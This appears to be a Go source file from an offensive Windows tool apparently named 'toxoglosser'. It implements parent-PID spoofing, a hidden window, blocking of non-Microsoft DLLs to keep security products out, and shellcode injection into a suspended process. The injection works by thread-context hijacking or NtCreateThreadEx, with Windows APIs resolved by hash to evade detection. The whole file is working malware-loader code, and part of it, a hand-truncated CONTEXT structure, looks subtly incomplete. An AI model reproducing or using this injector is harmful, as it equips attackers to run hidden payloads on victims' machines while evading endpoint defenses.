// core/process_spoofing.go
// Contains functions for creating processes with spoofed parent and DLL mitigation
package core

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"toxoglosser/common"
)

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
	
	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x10000000000000
)

// CreateProcessWithSpoofedParent creates a new process with a spoofed parent PID and DLL mitigation
func CreateProcessWithSpoofedParent(targetProcessPath string, spoofedParentPID uint32, payload []byte) error {
	// First, try to get a handle to the spoofed parent process
	parentProcessHandle, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		spoofedParentPID,
	)
	if err != nil {
		// If we can't access the parent, return an error
		return err
	}
	defer windows.CloseHandle(parentProcessHandle)

	// Initialize extended process and thread attributes
	var size uintptr
	// First call to get the required size
	success, err := initializeProcThreadAttributeList(nil, 2, 0, &size)
	if success || err != syscall.ERROR_INSUFFICIENT_BUFFER {
		// If we can't get the size, fall back to normal CreateProcess
		return createProcessSimple(targetProcessPath, payload)
	}

	// Allocate memory for the attribute list
	attributeList := make([]byte, size)
	attrList := (*ProcThreadAttributeList)(unsafe.Pointer(&attributeList[0]))

	// Initialize the attribute list
	success, err = initializeProcThreadAttributeList(attrList, 2, 0, &size)
	if !success {
		return err
	}
	defer deleteProcThreadAttributeList(attrList)

	// Add parent process attribute
	success, err = updateProcThreadAttribute(
		attrList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&parentProcessHandle)),
		unsafe.Sizeof(parentProcessHandle),
		nil,
		nil,
	)
	if !success {
		return err
	}

	// Add DLL mitigation policy
	policy := PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	success, err = updateProcThreadAttribute(
		attrList,
		0,
		PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
		uintptr(unsafe.Pointer(&policy)),
		unsafe.Sizeof(policy),
		nil,
		nil,
	)
	if !success {
		// Policy not supported on this version of Windows, continue without it
	}

	// Create the target process in suspended state with extended attributes
	var (
		si windows.StartupInfo
		pi windows.ProcessInformation
	)

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0

	// Create extended startup info structure
	var (
		siEx windows.StartupInfoEx
	)
	siEx.StartupInfo = si
	siEx.ProcThreadAttributeList = (*windows.ProcThreadAttributeList)(unsafe.Pointer(attrList))

	// Create the target process in suspended state
	err = windows.CreateProcess(
		nil, // ApplicationName
		windows.StringToUTF16Ptr(targetProcessPath),
		nil, // ProcessAttributes
		nil, // ThreadAttributes
		false, // InheritHandles
		windows.CREATE_SUSPENDED|windows.EXTENDED_STARTUPINFO_PRESENT, // CreationFlags
		nil, // Environment
		nil, // CurrentDirectory
		(*windows.StartupInfo)(&siEx.StartupInfo), // StartupInfo
		&pi, // ProcessInformation
	)

	if err != nil {
		return err
	}

	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// If payload is provided, inject it into the process
	if payload != nil && len(payload) > 0 {
		// Allocate memory in the target process for the payload
		shellcodeAddr, err := AllocateRXMemory(pi.Process, payload)
		if err != nil {
			return err
		}

		// Define CONTEXT structure manually (x64 context)
		type Context struct {
			P1Home   uint64
			P2Home   uint64
			P3Home   uint64
			P4Home   uint64
			P5Home   uint64
			P6Home   uint64
			ContextFlags uint32
			MxCsr    uint32
			SegCs    uint16
			SegDs    uint16
			SegEs    uint16
			SegFs    uint16
			SegGs    uint16
			SegSs    uint16
			EFlags   uint32
			Dr0      uint64
			Dr1      uint64
			Dr2      uint64
			Dr3      uint64
			Dr6      uint64
			Dr7      uint64
			Rax      uint64
			Rcx      uint64
			Rdx      uint64
			Rbx      uint64
			Rsp      uint64
			Rbp      uint64
			Rsi      uint64
			Rdi      uint64
			R8       uint64
			R9       uint64
			R10      uint64
			R11      uint64
			R12      uint64
			R13      uint64
			R14      uint64
			R15      uint64
			Rip      uint64
			// ... rest of structure
		}

		var ctx Context
		ctx.ContextFlags = 0x100001 // CONTEXT_CONTROL | CONTEXT_INTEGER

		// Resolve GetThreadContext manually using the common package
		kernel32Handle, err := common.GetModuleHandleByHash("kernel32.dll")
		if err != nil {
			fmt.Printf("[-] Failed to get kernel32 handle: %v. Using CreateRemoteThread fallback.\n", err)
			var threadHandle windows.Handle
			err = NtCreateThreadEx(
				&threadHandle,
				0x1FFFFF, // THREAD_ALL_ACCESS
				0,        // ObjectAttributes
				pi.Process,
				shellcodeAddr, // Start routine
				0,             // Parameter
				0,             // CreateSuspended (0 = start immediately)
				0,             // ZeroBits
				0,             // StackSize
				0,             // MaxStackSize
				0,             // AttributeList
			)
			if err != nil {
				return err
			}
			windows.CloseHandle(threadHandle)
			return nil
		}

		getThreadContextAddr, err := common.GetProcAddressByHash(windows.Handle(kernel32Handle), "GetThreadContext")
		if err != nil {
			fmt.Printf("[-] Failed to resolve GetThreadContext: %v. Using CreateRemoteThread fallback.\n", err)
			var threadHandle windows.Handle
			err = NtCreateThreadEx(
				&threadHandle,
				0x1FFFFF, // THREAD_ALL_ACCESS
				0,        // ObjectAttributes
				pi.Process,
				shellcodeAddr, // Start routine
				0,             // Parameter
				0,             // CreateSuspended (0 = start immediately)
				0,             // ZeroBits
				0,             // StackSize
				0,             // MaxStackSize
				0,             // AttributeList
			)
			if err != nil {
				return err
			}
			windows.CloseHandle(threadHandle)
			return nil
		}

		// Call GetThreadContext using syscall
		ret, _, _ := syscall.Syscall(
			getThreadContextAddr,
			2,
			uintptr(pi.Thread),
			uintptr(unsafe.Pointer(&ctx)),
			0,
		)
		if ret == 0 { // FALSE means failure
			// If GetThreadContext fails, fall back to creating a new thread in the process
			var threadHandle windows.Handle
			err = NtCreateThreadEx(
				&threadHandle,
				0x1FFFFF, // THREAD_ALL_ACCESS
				0,        // ObjectAttributes
				pi.Process,
				shellcodeAddr, // Start routine
				0,             // Parameter
				0,             // CreateSuspended (0 = start immediately)
				0,             // ZeroBits
				0,             // StackSize
				0,             // MaxStackSize
				0,             // AttributeList
			)
			if err != nil {
				return err
			}
			windows.CloseHandle(threadHandle)
			return nil
		}

		// Modify the instruction pointer to our payload
		ctx.Rip = uint64(shellcodeAddr)

		// Resolve SetThreadContext manually using the common package
		setThreadContextAddr, err := common.GetProcAddressByHash(windows.Handle(kernel32Handle), "SetThreadContext")
		if err != nil {
			return fmt.Errorf("failed to resolve SetThreadContext: %v", err)
		}

		// Call SetThreadContext using syscall
		ret, _, _ = syscall.Syscall(
			setThreadContextAddr,
			2,
			uintptr(pi.Thread),
			uintptr(unsafe.Pointer(&ctx)),
			0,
		)
		if ret == 0 { // FALSE means failure
			return fmt.Errorf("SetThreadContext failed")
		}

		// Resume the thread to execute our payload
		_, err = windows.ResumeThread(pi.Thread)
		if err != nil {
			return err
		}
	} else {
		// If no payload, just resume the original process
		_, err = windows.ResumeThread(pi.Thread)
		if err != nil {
			return err
		}
	}

	return nil
}

// ProcThreadAttributeList structure for process creation
type ProcThreadAttributeList struct {
	dwFlags  uint32
	Size     uint64
	Count    uint64
	Reserved uint64
	Unknown  *uintptr
}

// System calls for extended process creation
var (
	psNtdll                    = syscall.NewLazyDLL("ntdll.dll")
	psKernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procInitializeProcThreadAttributeList = psKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = psKernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = psKernel32.NewProc("DeleteProcThreadAttributeList")
)

func initializeProcThreadAttributeList(list *ProcThreadAttributeList, count uint32, flags uint32, size *uintptr) (bool, error) {
	ret, _, err := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(list)),
		uintptr(count),
		uintptr(flags),
		uintptr(unsafe.Pointer(size)),
	)
	return ret != 0, err
}

func updateProcThreadAttribute(
	list *ProcThreadAttributeList,
	flags uint32,
	attribute uintptr,
	data uintptr,
	size uintptr,
	returnSize *uintptr,
	previousSize *uintptr,
) (bool, error) {
	ret, _, err := procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(list)),
		uintptr(flags),
		attribute,
		data,
		size,
		uintptr(unsafe.Pointer(returnSize)),
		uintptr(unsafe.Pointer(previousSize)),
	)
	return ret != 0, err
}

func deleteProcThreadAttributeList(list *ProcThreadAttributeList) {
	procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(list)))
}

// createProcessSimple creates a process without PPID spoofing (fallback)
func createProcessSimple(targetProcessPath string, payload []byte) error {
	var (
		si windows.StartupInfo
		pi windows.ProcessInformation
	)

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0

	// Create the target process in suspended state
	err := windows.CreateProcess(
		nil, // ApplicationName
		windows.StringToUTF16Ptr(targetProcessPath),
		nil, // ProcessAttributes
		nil, // ThreadAttributes
		false, // InheritHandles
		windows.CREATE_SUSPENDED, // CreationFlags
		nil, // Environment
		nil, // CurrentDirectory
		&si, // StartupInfo
		&pi, // ProcessInformation
	)

	if err != nil {
		return err
	}

	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// If payload is provided, inject it into the process
	if payload != nil && len(payload) > 0 {
		// Allocate memory in the target process for the payload
		shellcodeAddr, err := AllocateRXMemory(pi.Process, payload)
		if err != nil {
			return err
		}

		// Simple implementation: Create a new thread to execute the payload
		var threadHandle windows.Handle
		err = NtCreateThreadEx(
			&threadHandle,
			0x1FFFFF, // THREAD_ALL_ACCESS
			0,        // ObjectAttributes
			pi.Process,
			shellcodeAddr, // Start routine
			0,             // Parameter
			0,             // CreateSuspended (0 = start immediately)
			0,             // ZeroBits
			0,             // StackSize
			0,             // MaxStackSize
			0,             // AttributeList
		)
		if err != nil {
			return err
		}
		windows.CloseHandle(threadHandle)
	} else {
		// If no payload, just resume the original process
		_, err = windows.ResumeThread(pi.Thread)
		if err != nil {
			return err
		}
	}

	return nil
}